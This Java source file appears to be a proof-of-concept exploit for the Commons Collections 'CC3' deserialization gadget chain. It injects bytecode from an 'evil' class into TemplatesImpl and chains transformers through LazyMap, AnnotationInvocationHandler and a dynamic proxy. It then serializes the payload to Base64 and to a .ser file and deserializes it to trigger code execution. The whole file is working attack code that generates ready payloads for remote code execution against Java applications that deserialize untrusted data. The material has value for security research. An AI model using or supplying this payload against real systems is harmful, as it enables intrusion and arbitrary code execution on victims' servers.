package mypoc.CCExp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import javax.tools.Tool;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC3 {

    static void setFieldValue(Object object, String member, Object value) throws Exception {
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field bytecodes = templatesClass.getDeclaredField(member);
        bytecodes.setAccessible(true);
        bytecodes.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        // create a evil {.class} file
        byte[] bytes = ToolClass.getEvilClassFilebytes();
        byte[][] evilBytes = new byte[][]{bytes};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "CC3");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_bytecodes", evilBytes);

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
        Map evilMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, evilMap);

        // auto-proxy
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        InvocationHandler handler1 = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxyMap);

        // serialize
        ByteArrayOutputStream byteArrayOutputStream = ToolClass.serializeData(handler1);
        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));
        // add to files
        File file = new File("serFiles/CC3.ser");
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        ObjectOutputStream objectOutputStreamFile = new ObjectOutputStream(fileOutputStream);
        objectOutputStreamFile.writeObject(handler1);

        // deserialize
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }


}
